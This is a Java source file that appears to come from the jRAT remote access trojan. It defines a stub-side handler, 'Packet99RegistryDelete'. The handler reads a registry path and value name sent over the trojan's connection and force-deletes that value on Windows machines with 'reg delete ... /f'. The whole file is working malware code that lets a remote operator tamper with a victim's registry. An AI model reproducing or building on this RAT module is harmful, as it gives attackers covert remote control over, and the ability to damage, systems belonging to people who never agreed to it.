package jrat.module.registry;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.incoming.AbstractIncomingPacket;
import oslib.OperatingSystem;

public class Packet99RegistryDelete extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = con.readLine();
		String value = con.readLine();

		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "reg", "delete", path + "\\", "/v", value, "/f" });
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
